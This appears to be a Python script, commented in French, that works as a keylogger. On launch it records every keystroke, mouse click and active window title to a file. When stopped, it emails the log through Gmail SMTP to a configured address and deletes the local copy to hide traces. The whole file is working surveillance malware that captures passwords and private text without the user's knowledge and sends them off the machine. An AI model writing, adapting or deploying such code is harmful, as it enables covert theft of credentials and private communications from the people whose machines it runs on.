import os
import shutil
import smtplib
from email.message import EmailMessage
from pynput import mouse, keyboard
from datetime import datetime
import socket
import platform
import subprocess
import ctypes

# Configuration initiale
sender_email = "your_email@example.com"
receiver_email = "receiver_email@example.com"
password = "your_password"  # Considérez l'utilisation d'une méthode plus sécurisée pour gérer les mots de passe

tracking_folder = "tracking_files"
os.makedirs(tracking_folder, exist_ok=True)

# Utilitaire pour obtenir le titre de la fenêtre active
def get_active_window_title():
    os_name = platform.system()
    if os_name == 'Windows':
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    elif os_name == 'Darwin':
        script = 'tell application "System Events" to get name of first application process whose frontmost is true'
        try:
            title = subprocess.check_output(["osascript", "-e", script]).decode("utf-8").strip()
            return title
        except subprocess.CalledProcessError:
            return "Unknown Window"
    else:
        return "Unsupported OS"

# Définition du tracker
class Tracker:
    def __init__(self):
        self.mouse_listener = mouse.Listener(on_click=self.on_click)
        self.keyboard_listener = keyboard.Listener(on_press=self.on_press)
        self.start_time = datetime.now()
        self.tracking_file_name = f"tracking_{self.start_time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        self.tracking_file_path = os.path.join(tracking_folder, self.tracking_file_name)

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.log_event(f'Mouse clicked at ({x}, {y})')

    def on_press(self, key):
        self.log_event(f'Key pressed: {str(key)}')

    def log_event(self, event):
        window_title = get_active_window_title()
        with open(self.tracking_file_path, 'a', encoding='utf-8') as f:
            f.write(f'{event} in window "{window_title}" at {datetime.now()}\n')

    def start_tracking(self):
        self.mouse_listener.start()
        self.keyboard_listener.start()

    def stop_tracking(self):
        self.mouse_listener.stop()
        self.keyboard_listener.stop()
        self.send_email()
        self.cleanup()

    def send_email(self):
        msg = EmailMessage()
        msg['Subject'] = 'Document de Tracking'
        msg['From'] = sender_email
        msg['To'] = receiver_email
        with open(self.tracking_file_path, 'rb') as f:
            msg.add_attachment(f.read(), maintype='application', subtype='octet-stream', filename=self.tracking_file_name)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender_email, password)
            smtp.send_message(msg)

    def cleanup(self):
        os.remove(self.tracking_file_path)
        if not os.listdir(tracking_folder):
            os.rmdir(tracking_folder)

# Exécution automatique du tracking au lancement du script
tracker = Tracker()
tracker.start_tracking()

# Pour s'assurer que le tracking s'arrête proprement et que l'email est envoyé à la fermeture du script
try:
    while True:
        pass
except KeyboardInterrupt:
    tracker.stop_tracking()
